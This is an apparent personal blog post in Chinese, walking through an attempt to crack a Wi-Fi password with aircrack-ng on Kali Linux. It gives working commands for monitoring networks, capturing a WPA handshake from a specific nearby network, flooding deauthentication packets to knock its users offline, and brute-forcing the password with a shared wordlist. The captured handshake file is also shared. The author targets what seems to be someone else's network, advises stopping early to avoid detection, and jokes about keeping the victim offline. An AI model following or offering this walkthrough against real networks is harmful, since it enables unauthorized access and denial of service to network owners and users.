---
layout: post
title:  "aircrack-ng破解Wi-Fi密码"
date:   2017-05-25 16:17:32 +0800
categories: hack your life
catalog:  true
tags:
  - hack your life
---



# 0 前言

一开始想用Mac系统做这件事情，上网搜了一下，发现没有管用的强制断开重新认证命令，很多人的博客甚至选择痴痴地等待。折腾了一会儿决定改变策略，用Kali Linux 来干这件事情。虚拟机安好后又找不到我的MacBook Air的无线网卡。后来在[kali linux上如何挂载无线网卡？](https://www.zhihu.com/question/40871402)  这篇回答中指出，虚拟机只能挂载USB无线网卡。难道我得装个系统在U盘上？想起以前街头扫码获赠过一个360随身WiFi，试了一下竟然能识别。整个获取握手包的过程还算顺利，最后竟然是安装Parallels tools 花了我很多时间，为了访问放在host设备上的字典文件。后来折腾半天也没搞定。就用优盘把握手包拷出来到host主机上了。



# 1 工具


1. [Kali Linux](https://www.kali.org/downloads/)    
2. 虚拟机 Parallels
3. USB 无线网卡，我用的是360随身Wi-Fi
4. aircrack-ng 
5. wpa字典 链接: https://pan.baidu.com/s/1eSEHh1g 密码🐎: 7weg



# 2 过程

## 1 检查插入的无线网卡
插入之前无线网卡之前，先运行一下

~~~
airmon-ng
~~~

插入无线网卡以后再运行一次
![snip20170525_0.png]({{ site.url }}/assets/snip20170525_0.png)
iwconfig查看无线网卡有没有加载成功，可以看到wlan0的无线设备
![snip20170525_1.png]({{ site.url }}/assets/snip20170525_1.png)


## 2 检查周围网络

~~~
airodump-ng wlan0
~~~


![snip20170525_2.png]({{ site.url }}/assets/snip20170525_2.png)

通过这个命令还真可以看，当前那个AP有客户端在连接，我挑了一个比较活跃的nan。

## 3 开始抓握手包

~~~
airodump -w sofia -c 3 wlan0
~~~

* -w 表示保存握手包，
* sofia为包的名称，随意设置，最终文件为sofia-01.cap
* -c 3 频道3
* wlan0  制定网卡设备
* 也可以制定想要的AP 我执行的命令就是

	 ~~~ 
	 airodump -w sofia -c 3  --bssid 54:E6:FC:30:54:DA  wlan0
	 ~~~


## 4 断开包


一开始不会有握手包被我抓到，于是我新开了一个终端，执行

~~~
aireplay-ng -0 -0 -a 54:E6:FC:30:54:DA  wlan0
~~~

![snip20170525_3.png]({{ site.url }}/assets/snip20170525_3.png)


* -0 为模式中的一种，冲突攻击模式，后面跟发送次数，设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网
* -a 指定无线AP的MAC地址，为该无线网的bssid。


发送断开包以后，会在之前的那个终端看到WPA handshake 字样，后面跟着bssid，CTRL+C停止嗅探握手包。
马上停止断开包，别让人家给发现异常了。

![snip20170525_4.png]({{ site.url }}/assets/snip20170525_4.png)

* BSSID--无线AP（路由器）的MAC地址
* PWR--这个值的大小反应信号的强弱，越大越好。
* RXQ--丢包率，越小越好.
* Beacons--大致就是反应客户端和AP的数据交换情况，通常此值不断变化。
* \#Data--如果有用户正在下载文件或看电影等大量数据传输的话，此值增长较快。 
* CH--工作频道。
* MB--连接速度
* ENC--编码方式。通常有WEP、WPA、TKIP等方式。
* ESSID--可以简单的理解为局域网的名称。

看到WPA handshake 字样，跟着一个不完整的bssid，握手包到手。😄



## 5 爆破

用字典爆破，网上随便找了几个字典

~~~
aircrack-ng sofia-01.cap -w  wpa专用.txt
~~~

和别的教程不一样，在运行了一个多小时以后，还没有出来结果，我才舍不得我的air来干这傻事，所以果断放弃了。

![snip20170525_5.png]({{ site.url }}/assets/snip20170525_5.png)

[握手包分享]({{ site.url }}/assets/20170525_sofia-01.cap)

# 3 技能Get

所以直到最后我还是不知道你的密码，唯一的收获是习得一个方法，可以一直发DeAuth包让你一直上不了网，害怕吧。


# 4 题外话
Parallels tools 是有多难安。我一路披荆斩棘，解决了一个又一个问题，最后也是果断放弃。

* 提示需要源，好，我搜搜。 When I try to install Parallels Tools in my virtual machine running Ubuntu, I get an error message that Parallels Tools needs the kernel source. [needs the kernel source](http://kb.parallels.com/en/113394)
* 运行失败，好我在研究研究。更新了源 
	* vi  /etc/apt/sources.list 
	* 修改源为 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
	* 然后执行apt-get update && apt-get dist-upgrade
* 还是不行，发现name -r 得到结果4.9.0-kali3-amd64但是sudo apt-get install linux-headers-得到   kali4，不一致，貌似得重启一下。
* 然后还是安装失败，提示我看一下log，至此放弃。先拷出来吧，不跟着儿耗着了。



# 5 参考<a name="reference"></a>


   1. [装在虚拟机里的 kali linux上如何挂载无线网卡
]( https://www.zhihu.com/question/40871402)
   2. 全程参考这篇文章，虽说有些笔误，但还是写得很好[aircrack-ng无线网WIFI破解教程(下) – WIFI破解实战 ](http://www.vuln.cn/2683
)
   3. 他的这篇原理也写得很好 [aircrack-ng无线网WIFI破解教程(上) - WIFI破解原理](http://www.vuln.cn/2674)